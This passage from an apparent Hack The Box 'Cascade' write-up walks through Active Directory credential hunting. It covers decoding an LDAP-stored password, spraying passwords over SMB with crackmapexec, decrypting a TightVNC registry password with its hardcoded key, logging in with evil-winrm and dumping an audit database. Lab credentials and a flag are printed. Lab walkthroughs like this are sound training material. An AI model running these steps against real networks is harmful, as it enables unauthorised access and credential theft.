+uSNChanged: 127173
+name: Remote Management Users
+objectGUID:: mcLF5nZ80kCiOcrXdXFmjA==
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZgQAAA==
+sAMAccountName: Remote Management Users
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117213546.0Z
+dSCorePropagationData: 20200117213257.0Z
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 16010714223232.0Z
+
+SHARES:
+\\Casc-DC1\Audit$
+\\Casc-DC1\Data
+
+# Ryan Thompson, Users, UK, cascade.local
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ryan Thompson
+sn: Thompson
+givenName: Ryan
+distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109193126.0Z
+whenChanged: 20200624203207.0Z
+displayName: Ryan Thompson
+uSNCreated: 24610
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 319688
+name: Ryan Thompson
+objectGUID:: LfpD6qngUkupEy9bFXBBjA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132247339091081169
+lastLogoff: 0
+lastLogon: 132247339125713230
+pwdLastSet: 132230718862636251
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200126183918.0Z
+dSCorePropagationData: 20200119174753.0Z
+dSCorePropagationData: 20200119174719.0Z
+dSCorePropagationData: 20200119174508.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132375043274134331
+msDS-SupportedEncryptionTypes: 0
+cascadeLegacyPwd: clk0bjVldmE=
+</pre></table></code></div></div><p>There were some small details that were not found in the other tools, such as the exact share folder naming. Easily overlooked, there was also an entry on the user <code class="language-plaintext highlighter-rouge">r.thompson</code> that seemed to have a potential password in the <strong>cascadeLegacyPwd</strong> field .</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ echo clk0bjVldmE= | base64 -d
+rY4n5eva
+</pre></table></code></div></div><p>Base64 decoding <code class="language-plaintext highlighter-rouge">clk0bjVldmE=</code> gave me the password <code class="language-plaintext highlighter-rouge">rY4n5eva</code>.</p><h4 id="crackmapexec">crackmapexec</h4><p>I saved this password to my <strong>passwords</strong> file and used <code class="language-plaintext highlighter-rouge">crackmapexec</code> to test all of the users against SMB with this password.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
+
+Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
+
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\r.thompson:rY4n5eva
+</pre></table></code></div></div><p>As expected, the password belonged to <code class="language-plaintext highlighter-rouge">r.thompson</code>.</p><h2 id="initial-foothold">Initial Foothold</h2><h3 id="enumeration-as-rthompson">Enumeration as <code class="language-plaintext highlighter-rouge">r.thompson</code></h3><h4 id="smbmap">smbmap</h4><p>Using my new credentials, I was able to get a full listing of the network shares on this machine.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
+[+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Audit$                                                  NO ACCESS
+        C$                                                      NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        print$                                                  READ ONLY       Printer Drivers
+        SYSVOL                                                  READ ONLY       Logon server share
+</pre></table></code></div></div><p>This user was only able to access <strong>Data</strong>, <strong>NETLOGON</strong>, <strong>print$</strong>, and <strong>SYSVOL</strong>.</p><h4 id="smbclient-1">smbclient</h4><p>I checked <strong>SYSVOL</strong> first since it can sometimes contain passwords, but neither it nor <strong>NETLOGON</strong> had anything interesting. The <strong>print$</strong> admin share only contained a bunch of printer drivers, and I didn’t want to jump down the rabbit hole of looking for exploits there until I had exhausted all other avenues of enumeration.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ smbclient -U r.thompson -W Cascade \\\\10.10.10.182\\data rY4n5eva
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Jan 26 22:27:34 2020
+  ..                                  D        0  Sun Jan 26 22:27:34 2020
+  Contractors                         D        0  Sun Jan 12 20:45:11 2020
+  Finance                             D        0  Sun Jan 12 20:45:06 2020
+  IT                                  D        0  Tue Jan 28 13:04:51 2020
+  Production                          D        0  Sun Jan 12 20:45:18 2020
+  Temps                               D        0  Sun Jan 12 20:45:15 2020
+
+                13106687 blocks of size 4096. 7794950 blocks available
+</pre></table></code></div></div><h2 id="road-to-user">Road to User</h2><p>After connecting to the Data share, I found folders corresponding to each of the business unit security groups I had seen earlier. Since <code class="language-plaintext highlighter-rouge">r.thompson</code> is a member of the <code class="language-plaintext highlighter-rouge">IT</code> group I figured that was probably what he had access to. (I did check the other folders; no access).</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>smb: \&gt; ls IT\
+  .                                   D        0  Tue Jan 28 13:04:51 2020
+  ..                                  D        0  Tue Jan 28 13:04:51 2020
+  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
+  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
+  Logs                                D        0  Tue Jan 28 19:53:04 2020
+  Temp                                D        0  Tue Jan 28 17:06:59 2020
+
+                13106687 blocks of size 4096. 7795046 blocks available
+smb: \&gt; tarmode
+tar:311  tarmode is now full, system, hidden, noreset, quiet
+smb: \&gt; recurse
+smb: \&gt; prompt
+smb: \&gt; mget *
+getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
+getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (6.9 KiloBytes/sec) (average 9.0 KiloBytes/sec)
+getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (28.3 KiloBytes/sec) (average 15.4 KiloBytes/sec)
+getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (13.8 KiloBytes/sec) (average 15.0 KiloBytes/sec)
+</pre></table></code></div></div><p>I used a little trick I had learned on the machine [<code class="language-plaintext highlighter-rouge">Nest</code>] Fix this link! (2020-05-31-nest.md) for downloading all of the files in an SMB folder recursively. After downloading all of the files, I browsed through my loot.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-email.png" alt="" /></p><p>I found another potential username <code class="language-plaintext highlighter-rouge">TempAdmin</code> in the <code class="language-plaintext highlighter-rouge">Meeting_Notes_June_2018.html</code> file. This user was given the same password as the normal admin account, so if I can find the password for one, I have the password for the other!</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
+1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
+1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
+2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
+2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
+8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
+8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
+</pre></table></code></div></div><p>This file <code class="language-plaintext highlighter-rouge">ArkAdRecycleBin.log</code> looked interesting. If I could login as <code class="language-plaintext highlighter-rouge">arksvc</code> it seemed likely that I would probably have <strong>SeBackupPrivilege</strong> which would grant pretty much instant pwn. This service account also has <code class="language-plaintext highlighter-rouge">Remote Management Users</code> group membership so it seems likely that this is a good path to look for.</p><h3 id="finding-user-creds"><strong>Finding user creds</strong></h3><p>The last file I opened was the most juicy looking. Registry keys often have interesting things in them.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade/IT/Temp/s.smith$ cat VNC\ Install.reg 
+��Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"ExtraPorts"=""
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+"DisconnectClients"=dword:00000001
+"PollingInterval"=dword:000003e8
+"AllowLoopback"=dword:00000000
+"VideoRecognitionInterval"=dword:00000bb8
+"GrabTransparentWindows"=dword:00000001
+"SaveLogToAllUsersPath"=dword:00000000
+"RunControlInterface"=dword:00000001
+"IdleTimeout"=dword:00000000
+"VideoClasses"=""
+"VideoRects"=""
+</pre></table></code></div></div><p>As soon as I saw the <code class="language-plaintext highlighter-rouge">VNC Install.reg</code> key I knew there had to be a password in it, and I was not disappointed. The password was encrypted and stored in a hexadecimal format, though <strong><code class="language-plaintext highlighter-rouge">frizb</code></strong> has a repository on GitHub that describes how to decrypt this at <a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>.</p><blockquote><p>VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines.</p></blockquote><div class="language-ruby highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="vg">$&gt;</span> <span class="n">msfconsole</span>
+
+<span class="n">msf5</span> <span class="o">&gt;</span> <span class="n">irb</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">IRB</span> <span class="n">shell</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">You</span> <span class="n">are</span> <span class="k">in</span> <span class="n">the</span> <span class="s2">"framework"</span> <span class="n">object</span>
+
+<span class="ss">irb: warn: </span><span class="n">can</span><span class="s1">'t alias jobs from irb_jobs.
+&gt;&gt; fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+&gt;&gt; require '</span><span class="n">rex</span><span class="o">/</span><span class="n">proto</span><span class="o">/</span><span class="n">rfb</span><span class="s1">'
+=&gt; true
+&gt;&gt; Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('</span><span class="no">H</span><span class="o">*</span><span class="err">'</span><span class="p">),</span> <span class="n">fixedkey</span>
+<span class="o">=&gt;</span> <span class="s2">"sT333ve2"</span>
+</pre></table></code></div></div><p><strong><code class="language-plaintext highlighter-rouge">frizb</code></strong> mentions that there is an easy way to decode this using the interactive Ruby prompt in Metasploit. Using the “industry standard” decryption key <code class="language-plaintext highlighter-rouge">\x17\x52\x6b\x06\x23\x4e\x58\x07</code> I was able to decode the password <code class="language-plaintext highlighter-rouge">sT333ve2</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\s.smith:sT333ve2
+</pre></table></code></div></div><h3 id="usertxt"><strong>User.txt</strong></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== ==============================================
+cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</pre></table></code></div></div><p>There were ne surprises in either the groups or privileges for <code class="language-plaintext highlighter-rouge">s.smith</code>. I was happy to find the <code class="language-plaintext highlighter-rouge">user.txt</code> file in the Desktop folder though!</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; type user.txt
+f29abe4e609b2aebb4fe99257a9eb507
+</pre></table></code></div></div><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-ssmith">Enumeration as <code class="language-plaintext highlighter-rouge">s.smith</code></h3><h4 id="smbmap-1">smbmap</h4><p>Once again I fired up <code class="language-plaintext highlighter-rouge">smbmap</code> to see what level of access this user had to the <strong>Audit$</strong> share folder since I didn’t know where it was mounted in the filesystem.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
+[+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Audit$                                                  READ ONLY
+        C$                                                      NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        print$                                                  READ ONLY       Printer Drivers
+        SYSVOL                                                  READ ONLY       Logon server share
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">s.smith</code> only had Read access to the <strong>Data</strong> and <strong>Audit</strong> shares, as well as <strong>print$</strong>, <strong>NETLOGON</strong>, and <strong>SYSVOL</strong></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/cascade$ smbclient -U s.smith -W Cascade \\\\10.10.10.182\\Audit$
+Enter CASCADE\s.smith's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Jan 29 13:01:26 2020
+  ..                                  D        0  Wed Jan 29 13:01:26 2020
+  CascAudit.exe                       A    13312  Tue Jan 28 16:46:51 2020
+  CascCrypto.dll                      A    12288  Wed Jan 29 13:00:20 2020
+  DB                                  D        0  Tue Jan 28 16:40:59 2020
+  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
+  x64                                 D        0  Sun Jan 26 17:25:27 2020
+  x86                                 D        0  Sun Jan 26 17:25:27 2020
+
+                13106687 blocks of size 4096. 7794884 blocks available
+</pre></table></code></div></div><p>Since I had already checked all of the other shares, I logged into the <strong>audit$</strong> share. The first file I checked, <code class="language-plaintext highlighter-rouge">RunAudit.bat</code>, only contained one line.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\shares\audit&gt; more RunAudit.bat
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+</pre></table></code></div></div><p>It looked like the executable <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> runs against the database file <code class="language-plaintext highlighter-rouge">Audit.db</code> when this batch script is run. I downloaded the database file and then used the command <code class="language-plaintext highlighter-rouge">sqlite3 Auditdb</code>, which got me a SQLite shell with which I could enumerate the database.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="n">zweilos</span><span class="o">@</span><span class="n">kalimaa</span><span class="p">:</span><span class="o">~/</span><span class="n">htb</span><span class="o">/</span><span class="k">cascade</span><span class="err">$</span> <span class="n">sqlite3</span> <span class="n">Audit</span><span class="p">.</span><span class="n">db</span> 
+<span class="n">SQLite</span> <span class="k">version</span> <span class="mi">3</span><span class="p">.</span><span class="mi">31</span><span class="p">.</span><span class="mi">1</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">27</span> <span class="mi">19</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">54</span>
+<span class="n">Enter</span> <span class="nv">".help"</span> <span class="k">for</span> <span class="k">usage</span> <span class="n">hints</span><span class="p">.</span>
+<span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">databases</span>
+<span class="n">main</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">zweilos</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="k">cascade</span><span class="o">/</span><span class="n">Audit</span><span class="p">.</span><span class="n">db</span>
+<span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">tables</span>
+<span class="n">DeletedUserAudit</span>  <span class="n">Ldap</span>              <span class="n">Misc</span>            
+<span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">dump</span> <span class="n">DeletedUserAudit</span> 
+<span class="n">PRAGMA</span> <span class="n">foreign_keys</span><span class="o">=</span><span class="k">OFF</span><span class="p">;</span>
+<span class="k">BEGIN</span> <span class="n">TRANSACTION</span><span class="p">;</span>
+<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="nv">"DeletedUserAudit"</span> <span class="p">(</span>
+        <span class="nv">"Id"</span>    <span class="nb">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span>
+        <span class="nv">"Username"</span>      <span class="nb">TEXT</span><span class="p">,</span>
+        <span class="nv">"Name"</span>  <span class="nb">TEXT</span><span class="p">,</span>
+        <span class="nv">"DistinguishedName"</span>     <span class="nb">TEXT</span>
+<span class="p">);</span>
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">DeletedUserAudit</span> <span class="k">VALUES</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="s1">'test'</span><span class="p">,</span><span class="k">replace</span><span class="p">(</span><span class="s1">'Test</span><span class="se">\n</span><span class="s1">DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d'</span><span class="p">,</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">)),</span><span class="s1">'CN=Test</span><span class="se">\0</span><span class="s1">ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local'</span><span class="p">);</span>
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">DeletedUserAudit</span> <span class="k">VALUES</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="s1">'deleted'</span><span class="p">,</span><span class="k">replace</span><span class="p">(</span><span class="s1">'deleted guy</span><span class="se">\n</span><span class="s1">DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef'</span><span class="p">,</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">)),</span><span class="s1">'CN=deleted guy</span><span class="se">\0</span><span class="s1">ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local'</span><span class="p">);</span>
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">DeletedUserAudit</span> <span class="k">VALUES</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="s1">'TempAdmin'</span><span class="p">,</span><span class="k">replace</span><span class="p">(</span><span class="s1">'TempAdmin</span><span class="se">\n</span><span class="s1">DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a'</span><span class="p">,</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">)),</span><span class="s1">'CN=TempAdmin</span><span class="se">\0</span><span class="s1">ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local'</span><span class="p">);</span>
+<span class="k">COMMIT</span><span class="p">;</span>
+<span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">dump</span> <span class="n">Ldap</span>
+<span class="n">PRAGMA</span> <span class="n">foreign_keys</span><span class="o">=</span><span class="k">OFF</span><span class="p">;</span>
+<span class="k">BEGIN</span> <span class="n">TRANSACTION</span><span class="p">;</span>
+<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="nv">"Ldap"</span> <span class="p">(</span>
+        <span class="nv">"Id"</span>    <span class="nb">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span>
+        <span class="nv">"uname"</span> <span class="nb">TEXT</span><span class="p">,</span>
+        <span class="nv">"pwd"</span>   <span class="nb">TEXT</span><span class="p">,</span>
+        <span class="nv">"domain"</span>        <span class="nb">TEXT</span>
+<span class="p">);</span>
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">Ldap</span> <span class="k">VALUES</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'ArkSvc'</span><span class="p">,</span><span class="s1">'BQO5l5Kj9MdErXx6Q6AGOw=='</span><span class="p">,</span><span class="s1">'cascade.local'</span><span class="p">);</span>
+<span class="k">COMMIT</span><span class="p">;</span>
